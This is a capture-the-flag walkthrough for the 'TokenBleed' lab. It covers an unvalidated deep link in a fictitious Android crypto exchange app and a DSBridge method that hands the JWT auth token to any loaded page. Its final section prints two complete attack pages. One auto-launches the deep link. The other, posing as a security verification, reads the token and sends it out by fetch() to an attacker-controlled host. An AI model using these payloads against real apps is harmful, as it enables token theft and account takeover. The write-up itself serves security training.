---
layout: single
title: "Mobile Hacking Labs - TokenBleed Challenge Walkthrough"
excerpt: "Exploiting DSBridge vulnerability in Android WebView to achieve remote JWT token theft"
date: 2025-08-14
classes: wide
header:
  teaser: /assets/images/mhl-tokenbleed/1.png
  teaser_home_page: true
categories:
  - reverse engineering
  - android
tags:  
  - ctf
  - android
---

## Description

> This challenge is centered around a fictitious Crypto exchange app, highlighting a critical security flaw related to an insecure web view implementation which can lead to exfiltration of sensitive data and 1-click account takeover.

## Objective

> Exploiting a DSBridge vulnerability in Android WebView to achieve remote JWT token theft and account takeover


The vulnerability we'll be exploiting involves a combination of several security weaknesses: unvalidated deep link processing, unsafe WebView configuration, and most critically, a globally exposed JavaScript bridge that returns sensitive authentication tokens to any loaded web content. What makes this particularly dangerous is that the attack can be executed remotely through a simple malicious link, requiring minimal user interaction.

[Challenge Link](https://www.mobilehackinglab.com/course/lab-tokenbleed).


## Inspecting Android Manifest

The first step in any Android application security assessment is to examine the AndroidManifest.xml file, which serves as the blueprint for the application's structure and permissions. This file reveals critical information about exported components, deep link configurations, and potential attack surfaces.

When I decompiled the MHL Crypto application using JADX, I discovered that the application has several activities, but the most intresting one is `SplashActivity`. This activity is particularly interesting because it's exported (meaning it can be invoked by external applications or intents) and configured to handle custom deep links. 

```xml
<activity android:name="com.mobilehackinglab.exchange.SplashActivity" 
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="mhlcrypto"/>
            </intent-filter>
        </activity>
```

Since the `SplashActivity` is exported with `android:exported="true"`, it can be launched by external applications, malicious apps installed on the same device, or through deep links from web browsers and other applications. This creates a significant attack surface that can be exploited remotely.

The activity is configured to handle custom deep links with the `mhlcrypto://` scheme. This means any application or web page can trigger this activity by creating a link with this custom scheme. The activity expects the following intent data URI scheme:

```
mhlcrypto://
```

This deep link configuration becomes the entry point for our exploitation chain, as we'll see in the subsequent analysis.

## Source Code Audit

After identifying the potential attack surface through the Android manifest analysis, the next crucial step is to conduct a thorough source code audit. Using JADX, I decompiled the APK to examine the application's internal logic and identify the specific vulnerability chain that could be exploited.

![Application Structure](/assets/images/mhl-tokenbleed/jadx.png)

The decompiled source code reveals a well-structured application with multiple components, each serving specific functions. However, from a security perspective, several of these components work together to create a dangerous vulnerability chain.

### Application Structure Analysis

The application structure reveals several key components that are relevant to our exploitation:

```
com.mobilehackinglab.exchange/
├── SplashActivity.java          # Entry point, handles deep links
├── MainActivity.java            # Main navigation, deep link processing
├── DWebViewActivity.java        # WebView with DSBridge
├── JsApi.java                   # JavaScript bridge interface
├── TokenManager.java            # Encrypted token storage
└── LoginActivity.java           # Dummy Authentication
```

### Deep Link Processing

The core of the vulnerability lies in how the application processes incoming deep links. After the `SplashActivity` receives the deep link intent, it forwards the processing to `MainActivity`, where the critical security flaw becomes apparent. The vulnerability chain starts in `MainActivity.java` with the `handleIntent()` function, which demonstrates a classic example of insufficient input validation:

```java
private final void handleIntent(Intent intent) {
    if (Intrinsics.areEqual(intent.getAction(), "android.intent.action.VIEW")) {
        Uri data = intent.getData();
        if (Intrinsics.areEqual(data != null ? data.getScheme() : null, "mhlcrypto")) {
            Uri data2 = intent.getData();
            if (!Intrinsics.areEqual("showPage", data2.getHost())) {
                return;
            }
            String queryParameter = data2.getQueryParameter("url");
            if (queryParameter == null) {
                return;
            }
            // User-controlled URL passed directly to WebView
            Intent intent2 = new Intent(this, DWebViewActivity.class);
            intent2.putExtra("url_to_load", queryParameter);
            startActivity(intent2);
        }
    }
}
```

This function is particularly dangerous because while it performs some basic validation checks, it fails to implement the most critical security control - URL validation. The function performs the following operations:

* Gets the current intent and checks if the action is `android.intent.action.VIEW`
* Ensures that the intent data scheme is `mhlcrypto://`
* Ensures that the intent data host is `showPage`
* Takes the `url` parameter and passes it directly to `DWebViewActivity` without any domain validation.

This means that an attacker can craft a deep link like `mhlcrypto://showPage?url=http://google.com` and the application will blindly load this attacker-controlled URL into its WebView. The only validation performed is checking that the URL starts with "http". We can test this locally by using the following adb command.

```
adb shell am start -W -a android.intent.action.VIEW -d "mhlcrypto://showPage?url=http://google.com

```
But the application has a validation and only allows HTTPS urls.

![ADB Test](/assets/images/mhl-tokenbleed/adb.gif)


### WebView Implementation

The `DWebViewActivity` is where the vulnerability becomes truly exploitable. This activity is responsible for creating and configuring the WebView that will load the attacker-controlled URL. What makes this particularly dangerous is the combination of permissive WebView settings and the exposure of sensitive JavaScript bridge functionality.

The `DWebViewActivity` sets up a WebView with DSBridge enabled through the following configuration:

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    // ... setup code ...
    
    String stringExtra = getIntent().getStringExtra("url_to_load");
    
    // WebView configuration
    WebSettings settings = this.binding.dwebview.getSettings();
    settings.setJavaScriptEnabled(true);
    settings.setDomStorageEnabled(true);
    settings.setAllowFileAccess(false);
    // ... other security settings ...
    
    this.binding.dwebview.setWebViewClient(new WebViewClient());
    
    // JavaScript bridge exposed globally
    this.binding.dwebview.addJavascriptObject(new JsApi(this), null);
    
    // Load user-controlled URL
    if (stringExtra != null && StringsKt.startsWith$default(stringExtra, "http", false, 2, null)) {
        this.binding.dwebview.loadUrl(stringExtra);
    }
}
```

The WebView configuration reveals several critical security weaknesses that make exploitation possible:

* **JavaScript is enabled** in the WebView, which is necessary for DSBridge functionality but also enables script execution from any loaded content
* **DSBridge is registered globally** with `null` as the namespace parameter, meaning any JavaScript code loaded in this WebView can access the bridge methods
* **No origin validation** is performed, so malicious websites have the same bridge access as legitimate content
* **Any HTTPS URL can be loaded** without domain validation or content verification
* **No Content Security Policy** is implemented to restrict what JavaScript can execute

This combination of settings are perfect for exploitation, where an attacker can load arbitrary JavaScript code with full access to native Android functionality through the exposed bridge.

### Discovering the Promo URL

While analyzing the DashboardFragment class source code in JADX, I discovered references to external URLs that the application loads in its WebView. One particularly interesting URL caught my attention - it appeared to be a promotional page hosted externally.

![Promo URL Discovery in JADX](/assets/images/mhl-tokenbleed/promo.png)

Since this was an external URL referenced in the source code, I decided to test what the application was actually doing with this URL. I opened the MHL Crypto app and navigated to the promotional section to see how this external content was being loaded and what functionality it had.

### Testing the Promo Functionality

When I clicked on the promotional links within the app, The page displayed personalized content including my username. This immediately caught my attention because it suggested that the web content was somehow accessing user authentication data from the native application.

![Promo Page Showing Username](/assets/images/mhl-tokenbleed/promo.gif)

To verify this behavior, I tried accessing the same promotional URL directly in a web browser outside of the app. Interestingly, when viewed in a regular browser, the page did not show any personalized content or username - it only displayed generic promotional text.

This discrepancy was a clear indicator that the WebView implementation was providing additional functionality or data access that wasn't available when the same content was viewed in a standard web browser.

### Analyzing the Promotional Page Source Code

I decided to inspect the HTML source code of the promotional page. The page contained JavaScript code that was specifically designed to interact with a mobile application bridge.

Here's the key HTML source code I found:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Summer Staking Bonus!</title>
    <script src="https://cdn.jsdelivr.net/npm/dsbridge/dist/dsbridge.js"></script>
    <style>
        :root { --mhl-green: #6200EE; --bg-light: #f4f6f8; --text-dark: #333; --text-light: #666; --card-bg: #ffffff; --border-color: #e0e0e0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; background-color: var(--bg-light); color: var(--text-dark); }
        .container { max-width: 600px; margin: 1.5rem auto; padding: 1rem; }
        .card { background-color: white; border: 1px solid #e0e0e0; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); padding: 1.5rem 2rem; text-align: left; }
        .promo-banner { width: 100%; height: auto; border-radius: 8px; margin-bottom: 1.5rem; }
        h1 { color: var(--mhl-green); margin-top: 0; font-size: 1.8em; }
        p { color: #666; line-height: 1.6; } hr { border: 0; border-top: 1px solid #eee; margin: 1rem 0; }
        .loading-text { color: #aaa; font-style: italic; }
        .bonus-highlight { background-color: #e8f5e9; color: #1b5e20; padding: 1rem; border-radius: 8px; text-align: center; margin-top: 1rem;}
    </style>
</head>
<body>
    <div class="container"> 
        <div class="card"> 
            <img src="/promo_banner.webp" alt="Summer Staking Bonus" class="promo-banner"/>
            <h1>Summer Staking Bonus!</h1>
            <div id="dynamic-content">
                <p class="loading-text">Personalizing your offer...</p>
            </div>
        </div> 
    </div>
    <script>
        function getBonusForTier(tier) {
            switch (String(tier).toLowerCase()) {
                case 'vip': return '50%'; 
                case 'gold': return '40%'; 
                case 'silver': return '30%'; 
                default: return '20%';
            }
        }
        
        async function authenticate() {
            const contentEl = document.getElementById('dynamic-content');
            
            if (!window.dsBridge) {
                contentEl.innerHTML = '<p><strong>Access Denied.</strong> Please use the MHLCrypto app.</p>';
                return;
            }
            
            // Direct token access via DSBridge
            dsBridge.call("getUserAuth", null, async function(tokenData) {
                if (!tokenData || !tokenData.data || !tokenData.data.authtoken) {
                    contentEl.innerHTML = '<p>Could not retrieve token from the app. Please log in again.</p>';
                    return;
                }
                
                try {
                    const response = await fetch('/api/verify', {
                        method: 'POST', 
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ token: tokenData.data.authtoken })
                    });
                    
                    const result = await response.json();
                    if (result.authenticated) {
                        let successHtml = '';
                        if (true) {
                            const bonus = getBonusForTier(result.tier);
                            successHtml = `<p>Welcome, <strong>${result.name}</strong>!</p>
                                         <p>As a valued <strong>${result.tier}</strong> member, you are pre-approved for our summer loyalty bonus.</p>
                                         <div class="bonus-highlight">Earn up to <strong>${bonus} APY</strong> on your staked assets!</div>`;
                        } else {
                            successHtml = `<p><strong>Welcome, ${result.name}</strong>!</p>
                                         <p>You have been successfully authenticated. Our support team can now see your account details to help you more effectively.</p>`;
                        }
                        contentEl.innerHTML = successHtml;
                    } else {
                        contentEl.innerHTML = '<strong>Authentication Failed:</strong><br><small>' + result.error + '</small>';
                    }
                } catch (e) { 
                    contentEl.innerText = "Error contacting verification server."; 
                }
            });
        }
        
        authenticate();
    </script>
</body>
</html>
```

### Key Discoveries from the Promo Page Analysis

This HTML source code revealed several security issues:

1. **DSBridge Integration**: The page explicitly loads the DSBridge JavaScript library (`https://cdn.jsdelivr.net/npm/dsbridge/dist/dsbridge.js`), confirming that the WebView is configured to use DSBridge for JavaScript-to-native communication.

2. **Direct Token Access**: The `dsBridge.call("getUserAuth", null, ...)` function call showed that any JavaScript code loaded in the WebView could directly request and receive the user's complete authentication token.

3. **No Security Validation**: The code showed no origin validation, domain restrictions, or security checks. Any web page loaded in this WebView would have the same access to the `getUserAuth` method.

4. **Token Structure Revealed**: The code expected `tokenData.data.authtoken`, revealing the exact structure of the token object returned by the native bridge.

### JavaScript Bridge Analysis

The most critical component of this vulnerability is the JavaScript bridge implementation in the `JsApi.java` class. This bridge serves as the interface between the WebView's JavaScript context and the native Android application, and it's here that the most sensitive functionality is exposed without any security controls.

DSBridge is a popular library that provides enhanced communication capabilities between JavaScript and native Android code. However, when implemented without proper security considerations, it can become a great attack vector. The `JsApi.java` class exposes several methods through the `@JavascriptInterface` annotation, making them callable from any JavaScript code loaded in the WebView:

```java
public final class JsApi {
    private final Context context;

    @JavascriptInterface
    public final void getUserAuth(Object args, CompletionHandler<Object> handler) {
        String token = new TokenManager(this.context).getToken();
        if (token != null) {
            // Returns complete authentication token to JavaScript
            handler.complete(new JSONObject(token));
        } else {
            handler.complete(new JSONObject().put("error", "No token found"));
        }
    }

    @JavascriptInterface
    public final void openNewWindow(Object args) {
        // ... implementation for opening new WebView windows
    }
}
```

## Exploitation Strategy

With a comprehensive understanding of the vulnerability chain, I developed a multi-stage exploitation strategy that demonstrates the complete attack path from initial access to token theft. I simply needed to host my own malicious content and leverage the application's own deep link functionality to load it.

The exploitation strategy consists of several key components:

1. **Crafting a malicious deep link loader** that use the `mhlcrypto://showPage?url=` scheme to load our malicious pages into the vulnerable WebView
2. **Creating a malicious HTML file** that mimic legitimate promotional content while secretly calling the exposed DSBridge methods and sent the token to the attacker server


## Creating the Malicious Payload

I created two HTML files for the attack:

### 1. Deep Link Trigger Page

This page creates the deep link to launch the vulnerable app:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Launch MHL Crypto</title>
</head>
<body>
    <h1>MHL Crypto Security Verification</h1>
    <p>Click the button to launch the MHL Crypto app:</p>
    
    <button onclick="launchApp()">Launch MHL Crypto</button>
    <p id="status"></p>
    
    <script>
        function launchApp() {
            const deepLink = 'mhlcrypto://showPage?url=https://solid-space-orbit-r7gj6g77x4phwqv6-8088.app.github.dev/exploit.html';
            
            document.getElementById('status').textContent = 'Launching MHL Crypto app...';
            window.location.href = deepLink;
            console.log('Deep link launched:', deepLink);
        }
        
        // Auto-launch after 2 seconds
        setTimeout(() => {
            document.getElementById('status').textContent = 'Auto-launching in 2 seconds...';
            setTimeout(launchApp, 2000);
        }, 1000);
    </script>
</body>
</html>
```

### 2. Token Extraction Payload

The main exploitation payload that gets loaded into the WebView:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Summer Staking Bonus!</title>
    <script src="https://cdn.jsdelivr.net/npm/dsbridge/dist/dsbridge.js"></script>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            margin: 0; padding: 20px; 
            background: linear-gradient(135deg, #6200EE 0%, #3700B3 100%);
            color: white; text-align: center; 
        }
        .container { 
            max-width: 600px; margin: 50px auto; 
            background: rgba(255,255,255,0.1); 
            border-radius: 16px; padding: 30px; 
        }
        .status { 
            padding: 15px; border-radius: 8px; margin: 15px 0; 
        }
        .success { 
            background-color: #4CAF50; color: white; 
        }
        .error { 
            background-color: #f44336; color: white; 
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 MHL Crypto Authentication</h1>
        <div id="dynamic-content">
            <p>Verifying your account security...</p>
        </div>
    </div>
    
     <script>
        async function authenticate() {
            const contentEl = document.getElementById('dynamic-content');
            
            if (!window.dsBridge) {
                contentEl.innerHTML = '<div class="status error"><strong>Access Denied.</strong> Please use the MHLCrypto app.</div>';
                return;
            }

            dsBridge.call("getUserAuth", null, async function(tokenData) {

                if (!tokenData || !tokenData.data || !tokenData.data.authtoken) {
                    contentEl.innerHTML = '<div class="status error">Could not retrieve token from the app. Please log in again.</div>';
                    return;
                }
                const params = new URLSearchParams({
                    timestamp: new Date().toISOString(),
                    token: tokenData.data.authtoken
                });

                const webhook = 'https://solid-space-orbit-r7gj6g77x4phwqv6-8088.app.github.dev/token?' + params.toString();

                try {
                    await fetch(webhook, {
                        method: 'GET',
                        mode: 'no-cors'
                    });
                    
                    contentEl.innerHTML += '<div class="status success">✅ Authentication verified successfully!</div>';
                    
                } catch (error) {
                    console.log('❌ Failed to send via fetch', error);
                }
                
                
            });
        }
        window.addEventListener('load', authenticate);
        setTimeout(authenticate, 1000);
    </script>
</body>
</html>
```

![exploit](/assets/images/mhl-tokenbleed/exploit.gif)

Once we exfiltrate the JWT token we can decode it and get the flag.

![flag](/assets/images/mhl-tokenbleed/flag.png)


